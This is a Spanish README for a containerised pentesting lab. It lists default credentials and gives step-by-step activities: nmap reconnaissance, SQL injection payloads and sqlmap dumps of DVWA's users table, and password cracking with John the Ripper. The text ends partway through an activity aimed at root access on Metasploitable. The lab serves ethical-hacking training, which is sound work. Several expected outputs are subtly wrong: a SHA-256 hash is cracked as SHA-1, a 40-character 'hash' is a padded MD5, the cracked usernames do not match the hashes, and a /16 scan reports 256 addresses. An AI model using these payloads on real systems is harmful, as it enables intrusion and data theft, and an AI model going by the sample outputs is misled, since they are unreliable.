# 🛡️ Laboratorio de Vulnerabilidades Docker

![Docker](https://img.shields.io/badge/docker-%230db7ed.svg?style=for-the-badge&logo=docker&logoColor=white)
![Kali](https://img.shields.io/badge/Kali-268BEE?style=for-the-badge&logo=kalilinux&logoColor=white)
![Security](https://img.shields.io/badge/security-pen%20testing-red?style=for-the-badge)

Entorno completo containerizado para práctica de pentesting, análisis de vulnerabilidades y demostración de técnicas de hacking ético.

## 📋 Tabla de Contenidos

- [🚀 Inicio Rápido](#-inicio-rápido)
- [🏗️ Arquitectura del Laboratorio](#️-arquitectura-del-laboratorio)
- [⚙️ Configuración](#️-configuración)
- [🎯 Actividades Paso a Paso](#-actividades-paso-a-paso)
- [🔧 Gestión del Laboratorio](#-gestión-del-laboratorio)
- [🆘 Solución de Problemas](#-solución-de-problemas)

---

## 🚀 Inicio Rápido

### Prerrequisitos
- **Docker** 20.10+ y **Docker Compose** 2.0+
- **8GB RAM** mínimo (16GB recomendado)
- **20GB** espacio libre en disco
- **Sistema operativo:** Windows 10/11, macOS, Linux

### Instalación en 3 Pasos

```bash
# 1. Clonar/Descargar el laboratorio
git clone <este-repositorio>
cd cybersec-lab

# 2. Levantar todos los servicios
docker-compose up -d

# 3. Verificar estado
docker-compose ps
```

**⏱️ Tiempo de despliegue:** 5-10 minutos (primera vez)

---

## 🏗️ Arquitectura del Laboratorio

### 🌐 Mapa de Red

```
Laboratorio Docker (172.25.0.0/16)
├── 🔴 Kali Linux (172.25.0.10) - Atacante
├── 🕷️ DVWA (172.25.0.20:8080) - Web App Vulnerable
├── 🍋 Juice Shop (172.25.0.21:3000) - OWASP Modern
├── 🐐 WebGoat (172.25.0.22:8081) - Lecciones OWASP
├── 🐛 bWAPP (172.25.0.23:8082) - 100+ Bugs
├── 📱 DVNA (172.25.0.24:9090) - Node.js Vulnerable
├── 💥 Metasploitable (172.25.0.30:2222) - Sistema Linux
├── 🗄️ MySQL (172.25.0.40:3307) - Base de Datos
├── 📁 FTP (172.25.0.41:2120) - Servidor Archivos
└── 🖥️ Portainer (172.25.0.50:9000) - Gestión Docker
```

### 📊 Resumen de Servicios

| Servicio | IP | Puerto Host | Credenciales | Nivel Riesgo |
|----------|----|-----------:|--------------|:------------:|
| **Kali Linux** | 172.25.0.10 | Terminal | root/toor | N/A |
| **DVWA** | 172.25.0.20 | 8080 | admin/password | 🟨 Medio |
| **Juice Shop** | 172.25.0.21 | 3000 | Registro libre | 🟨 Medio |
| **WebGoat** | 172.25.0.22 | 8081 | guest/guest | 🟨 Medio |
| **bWAPP** | 172.25.0.23 | 8082 | bee/bug | 🟨 Medio |
| **DVNA** | 172.25.0.24 | 9090 | Sin auth inicial | 🟨 Medio |
| **Metasploitable** | 172.25.0.30 | 2222 | msfadmin/msfadmin | 🟥 Crítico |
| **MySQL** | 172.25.0.40 | 3307 | root/password | 🟨 Medio |
| **FTP** | 172.25.0.41 | 2120 | ftpuser/ftppass | 🟨 Medio |
| **Portainer** | 172.25.0.50 | 9000 | Setup inicial | 🟩 Bajo |

---

## ⚙️ Configuración

### 1. Preparación del Entorno

```bash
# Crear directorios necesarios
mkdir -p cybersec-lab/{shared,tools,reports,wordlists,mysql-init}
cd cybersec-lab

# Crear archivo docker-compose.yml
# (Copiar el contenido del docker-compose.yml proporcionado)
```

### 2. Configuración de MySQL (Opcional)

```bash
# Crear script de inicialización
cat > mysql-init/init.sql << 'EOF'
CREATE DATABASE IF NOT EXISTS vulnerable_db;
USE vulnerable_db;

CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50),
    password VARCHAR(100),
    email VARCHAR(100)
);

INSERT INTO users VALUES 
(1, 'admin', 'admin123', 'admin@test.com'),
(2, 'user', 'password', 'user@test.com'),
(3, 'guest', 'guest123', 'guest@test.com');

GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' WITH GRANT OPTION;
FLUSH PRIVILEGES;
EOF
```

### 3. Despliegue del Laboratorio

```bash
# Levantar todos los servicios
docker-compose up -d

# Verificar que todos los contenedores estén corriendo
docker-compose ps

# Ver logs de inicialización
docker-compose logs -f kali
```

**✅ Resultado Esperado:**
```
NAME                 COMMAND             SERVICE       STATUS
kali-attacker        "/bin/bash"         kali          Up
dvwa-target          "/bin/sh -c /main.sh" dvwa        Up (healthy)
juiceshop-target     "docker-entrypoint..." juiceshop   Up (healthy)
webgoat-target       "java -Djava.secur..." webgoat     Up (healthy)
metasploitable-target "/bin/sh"           metasploitable Up
portainer-manager    "/portainer"        portainer     Up (healthy)
```

---

## 🎯 Actividades Paso a Paso

### 🔍 ACTIVIDAD 1: Reconocimiento de Red (15 minutos)

#### Objetivo
Identificar todos los servicios activos en el laboratorio y sus vulnerabilidades potenciales.

#### Pasos

**1.1 Acceder a Kali Linux**
```bash
# Conectar al contenedor atacante
docker exec -it kali-attacker bash

# Verificar herramientas instaladas
which nmap sqlmap metasploit-framework
```

**✅ Resultado Esperado:**
```
/usr/bin/nmap
/usr/bin/sqlmap
/usr/bin/msfconsole
```

**1.2 Descubrimiento de Hosts**
```bash
# Escanear la red del laboratorio
nmap -sn 172.25.0.0/16

# Resultado esperado: 10 hosts activos
```

**✅ Resultado Esperado:**
```
Nmap scan report for 172.25.0.10
Host is up (0.000010s latency).

Nmap scan report for 172.25.0.20
Host is up (0.000020s latency).

Nmap scan report for 172.25.0.21
Host is up (0.000015s latency).
...
Nmap done: 256 IP addresses (10 hosts up) scanned in 2.05 seconds
```

**1.3 Escaneo de Puertos Específicos**
```bash
# Escaneo rápido de objetivos principales
nmap -F 172.25.0.20 172.25.0.21 172.25.0.30

# Escaneo detallado de Metasploitable
nmap -sS -sV -A 172.25.0.30
```

**✅ Resultado Esperado para Metasploitable:**
```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1
23/tcp   open  telnet      Linux telnetd
80/tcp   open  http        Apache httpd 2.2.8
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
```

**1.4 Escaneo de Vulnerabilidades**
```bash
# Buscar vulnerabilidades conocidas
nmap --script vuln 172.25.0.30
```

---

### 🕷️ ACTIVIDAD 2: SQL Injection en DVWA (20 minutos)

#### Objetivo
Demostrar explotación de SQL injection para extraer datos de la base de datos.

#### Pasos

**2.1 Configuración Inicial de DVWA**

1. Abrir navegador: `http://localhost:8080`
2. **Login:** admin / password
3. **Setup:** Click "Create / Reset Database"
4. **Volver a loguearse:** admin / password
5. **Configurar seguridad:** DVWA Security → Low → Submit

**✅ Resultado Esperado:**
- Página principal de DVWA visible
- Menú lateral con vulnerabilidades disponibles
- Nivel de seguridad en "Low"

**2.2 Identificación Manual de SQL Injection**

```bash
# Navegar a: http://localhost:8080/vulnerabilities/sqli/

# Prueba 1: Entrada normal
User ID: 1
Click "Submit"
```

**✅ Resultado Esperado:**
```
ID: 1
First name: admin
Surname: admin
```

```bash
# Prueba 2: SQL Injection básico
User ID: 1' OR '1'='1
Click "Submit"
```

**✅ Resultado Esperado:**
```
ID: 1
First name: admin
Surname: admin

ID: 2  
First name: Gordon
Surname: Brown

ID: 3
First name: Hack
Surname: Me

ID: 4
First name: Pablo
Surname: Picasso

ID: 5
First name: Bob
Surname: Smith
```

**2.3 Extracción de Datos Sensibles**

```bash
# Determinar número de columnas
User ID: 1' ORDER BY 1--
User ID: 1' ORDER BY 2--  
User ID: 1' ORDER BY 3--   # Este debería dar error

# Extraer usuarios y passwords
User ID: 1' UNION SELECT user, password FROM users--
```

**✅ Resultado Esperado:**
```
ID: admin
First name: 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
Surname: 

ID: gordonb
First name: e99a18c428cb38d5f260853678922e03abd12345
Surname: 

ID: 1337
First name: 8d3533d75ae2c3966d7e0d4fcc69216b75de9d10
Surname: 
```

**2.4 Automatización con SQLmap**

```bash
# Desde Kali, obtener cookies de sesión
curl -c cookies.txt -d "username=admin&password=password&Login=Login" \
http://172.25.0.20/login.php

# Extraer valor de PHPSESSID de cookies.txt
cat cookies.txt | grep PHPSESSID

# Usar SQLmap
sqlmap -u "http://172.25.0.20/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="security=low; PHPSESSID=VALOR_OBTENIDO" \
--dbs --batch

# Enumerar tablas
sqlmap -u "http://172.25.0.20/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="security=low; PHPSESSID=VALOR_OBTENIDO" \
-D dvwa --tables --batch

# Dump usuarios
sqlmap -u "http://172.25.0.20/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="security=low; PHPSESSID=VALOR_OBTENIDO" \
-D dvwa -T users --dump --batch
```

**✅ Resultado Esperado:**
```
[INFO] testing connection to the target URL
[INFO] testing if the target URL content is stable
[INFO] target URL content is stable
[INFO] testing if GET parameter 'id' is dynamic
[INFO] GET parameter 'id' appears to be dynamic
[INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable
[INFO] testing for SQL injection on GET parameter 'id'

Database: dvwa
Table: users
[5 entries]
+--------+---------------------+---------+
| user   | password            | user_id |
+--------+---------------------+---------+
| admin  | 5e884898da28047...  | 1       |
| gordonb| e99a18c428cb38d...  | 2       |
| 1337   | 8d3533d75ae2c39...  | 3       |
| pablo  | 0d107d09f5bbe40...  | 4       |
| smithy | 5d41402abc4b2a7...  | 5       |
+--------+---------------------+---------+
```

**2.5 Cracking de Passwords**

```bash
# Guardar hashes en archivo
echo "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8" > /tmp/hashes.txt
echo "e99a18c428cb38d5f260853678922e03abd12345" >> /tmp/hashes.txt
echo "8d3533d75ae2c3966d7e0d4fcc69216b75de9d10" >> /tmp/hashes.txt

# Usar John the Ripper
john --format=raw-sha1 --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hashes.txt

# Ver resultados
john --show --format=raw-sha1 /tmp/hashes.txt
```

**✅ Resultado Esperado:**
```
admin:password
hello:password
letmein:password

3 password hashes cracked, 0 left
```

---

### 💥 ACTIVIDAD 3: Compromiso de Metasploitable (25 minutos)

#### Objetivo
Obtener acceso root completo al sistema Metasploitable usando múltiples vectores de ataque.

#### Pasos

**3.1 Reconocimiento Exhaustivo**

```bash
# Escaneo completo de Metasploitable
nmap -p- -sV -sC -A 172.25.0.30

# Guardar resultados
nmap -p- -sV -sC -A 172.25.0.30 -oA metasploitable_scan
```

**✅ Resultado Esperado:**
```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
53/tcp   open  domain      ISC BIND 9.4.2
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp  open  exec        netkit-rsh rexecd
513/tcp  open  login       OpenBSD or Solaris rlogind
514/tcp  open  shell       Netkit rshd
1099/tcp open  java-rmi    GNU Classpath grmiregistry
1524/tcp open  bindshell   Metasploitable root shell
2049/tcp open  nfs         2-4 (RPC #100003)
2121/tcp open  ftp         ProFTPD 1.3.1
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp open  vnc         VNC (protocol 3.3)
6000/tcp open  X11         (access denied)
6667/tcp open  irc         UnrealIRCd
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
